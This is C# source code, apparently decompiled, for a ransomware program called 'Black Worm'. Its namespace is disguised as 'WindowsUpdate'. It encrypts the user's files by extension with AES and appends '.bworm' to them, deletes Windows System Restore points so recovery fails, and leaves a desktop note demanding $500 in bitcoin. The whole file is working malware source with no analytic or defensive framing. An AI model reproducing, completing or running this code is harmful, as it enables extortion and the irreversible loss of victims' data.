using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class RansomWare
{
	private string userName;

	private string computerName;

	private string userDir;

	private string targetURL
	{
		[DebuggerNonUserCode]
		get;
		[DebuggerNonUserCode]
		set;
	}

	public RansomWare()
	{
		userName = Environment.UserName;
		computerName = Environment.MachineName.ToString();
		userDir = "C:\\Users\\";
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		checked
		{
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.KeySize / 8.0));
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)rijndaelManaged.BlockSize / 8.0));
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < Math.Max(Interlocked.Decrement(ref length), checked(length + 1)))
		{
			stringBuilder.Append("abcdefgbijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefgbijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public object SendPassword(string password)
	{
		return password;
	}

	public void EncryptFile(string file, string password)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] bytes = default(byte[]);
		byte[] bytesToBeEncrypted = default(byte[]);
		byte[] array = default(byte[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 143:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_0031;
						case 6:
							goto IL_003d;
						case 7:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_003d:
					num = 6;
					File.WriteAllBytes(file, bytes);
					break;
					IL_0031:
					num = 5;
					bytes = AES_Encrypt(bytesToBeEncrypted, array);
					goto IL_003d;
					IL_0009:
					num = 2;
					bytesToBeEncrypted = File.ReadAllBytes(file);
					goto IL_0013;
					IL_0013:
					num = 3;
					array = Encoding.UTF8.GetBytes(password);
					goto IL_0022;
					IL_0022:
					num = 4;
					array = SHA256.Create().ComputeHash(array);
					goto IL_0031;
					end_IL_0001_2:
					break;
				}
				num = 7;
				File.Move(file, file + ".bworm");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 143;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void encryptDirectory(string location, string password)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string[] directories = default(string[]);
		string text = default(string);
		string[] files = default(string[]);
		int num6 = default(int);
		int num7 = default(int);
		string extension = default(string);
		int num10 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int num8;
					int num11;
					int num9;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_000a;
					case 955:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0001;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000a;
							case 3:
								goto IL_02db;
							case 4:
								goto IL_02e5;
							case 5:
								goto IL_02ef;
							case 6:
								goto IL_0306;
							case 7:
								goto IL_0313;
							case 8:
								goto IL_031f;
							case 9:
							case 10:
								goto IL_032d;
							case 11:
								goto IL_0339;
							case 12:
								goto IL_0349;
							case 13:
								goto IL_0358;
							default:
								goto end_IL_0001;
							case 14:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_0358:
						num = 13;
						num5++;
						goto IL_0362;
						IL_0349:
						num = 12;
						encryptDirectory(directories[num5], password);
						goto IL_0358;
						IL_000a:
						num = 2;
						text = ".txt" + ".jar" + ".exe" + ".dat" + ".contact" + ".settings" + ".doc" + ".docx" + ".xls" + ".xlsx" + ".ppt" + ".pptx" + ".odt" + ".jpg" + ".png" + ".jpeg" + ".gif" + ".csv" + ".py" + ".sql" + ".mdb" + ".sln" + ".php" + ".asp" + ".aspx" + ".html" + ".htm" + ".xml" + ".psd" + ".pdf" + ".dll" + ".c" + ".cs" + ".vb" + ".mp3" + ".mp4" + ".f3d" + ".dwg" + ".cpp" + ".zip" + ".rar" + ".mov" + ".rtf" + ".bmp" + ".mkv" + ".avi" + ".apk" + ".lnk" + ".iso" + ".7z" + ".ace" + ".arj" + ".bz2" + ".cab" + ".gzip" + ".lzh" + ".tar" + ".uue" + ".xz" + ".z" + ".001" + ".mpeg" + ".mp3" + ".mpg" + ".core" + ".crproj" + ".pdb" + ".ico" + ".pas" + ".db" + ".torrent";
						goto IL_02db;
						IL_02db:
						num = 3;
						files = Directory.GetFiles(location);
						goto IL_02e5;
						IL_02e5:
						num = 4;
						directories = Directory.GetDirectories(location);
						goto IL_02ef;
						IL_02ef:
						num = 5;
						num6 = files.Length - 1;
						num7 = 0;
						goto IL_02fc;
						IL_02fc:
						num8 = num7;
						num9 = num6;
						if (num8 <= num9)
						{
							goto IL_0306;
						}
						goto IL_0339;
						IL_0306:
						num = 6;
						extension = Path.GetExtension(files[num7]);
						goto IL_0313;
						IL_0313:
						num = 7;
						if (text.Contains(extension))
						{
							goto IL_031f;
						}
						goto IL_032d;
						IL_031f:
						num = 8;
						EncryptFile(files[num7], password);
						goto IL_032d;
						IL_032d:
						num = 10;
						num7++;
						goto IL_02fc;
						IL_0339:
						num = 11;
						num10 = directories.Length - 1;
						num5 = 0;
						goto IL_0362;
						IL_0362:
						num11 = num5;
						num9 = num10;
						if (num11 > num9)
						{
							goto end_IL_0001_2;
						}
						goto IL_0349;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 955;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object startAction()
	{
		int try0001_dispatch = -1;
		int num = default(int);
		string text = default(string);
		int num2 = default(int);
		int num3 = default(int);
		string password = default(string);
		string fileName = default(string);
		string text2 = default(string);
		string location = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string s;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					text = "\\Desktop\\READ_IT.txt";
					goto IL_000a;
				case 337:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_0029;
						case 5:
							goto IL_0075;
						case 6:
							goto IL_0096;
						case 7:
							goto IL_009f;
						case 8:
							goto IL_00b6;
						case 9:
							goto IL_00ca;
						case 10:
							goto IL_00d4;
						case 11:
							goto IL_00e1;
						case 12:
							goto IL_00f1;
						case 13:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 14:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00f1:
					num = 12;
					password = null;
					break;
					IL_00e1:
					num = 11;
					messageCreator(A.BitcoinAddress);
					goto IL_00f1;
					IL_000a:
					num = 2;
					fileName = userDir + userName + text;
					goto IL_0020;
					IL_0020:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0029;
					IL_0029:
					num = 4;
					s = "BWORM[" + A.MTX + "-" + CreatePassword(20) + "]";
					password = A.ENB(ref s);
					goto IL_0075;
					IL_0075:
					num = 5;
					File.WriteAllText(Interaction.Environ("Temp") + "\\Ransom.dat", "Yes");
					goto IL_0096;
					IL_0096:
					num = 6;
					text2 = "\\";
					goto IL_009f;
					IL_009f:
					num = 7;
					location = userDir + userName + text2;
					goto IL_00b6;
					IL_00b6:
					num = 8;
					A.ransompassword = Conversions.ToString(SendPassword(password));
					goto IL_00ca;
					IL_00ca:
					num = 9;
					removeRestorePoint();
					goto IL_00d4;
					IL_00d4:
					num = 10;
					encryptDirectory(location, password);
					goto IL_00e1;
					end_IL_0001_2:
					break;
				}
				num = 13;
				Process.Start(fileName);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 337;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public object messageCreator(string BitcoitAddress)
	{
		string text = "\\Desktop\\READ_IT.txt";
		string path = userDir + userName + text;
		string[] contents = new string[5]
		{
			"[ Warning ]",
			"Your Files has been encrypted with Black Worm RansomWare",
			"Send 500$ in bitcoins to my Bitcoin Address",
			"Bicoint Address : " + BitcoitAddress,
			"[ End Of Message ]"
		};
		File.WriteAllLines(path, contents);
		object result = default(object);
		return result;
	}

	public void removeRestorePoint()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			new StringBuilder();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(checked((int)Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber"))));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
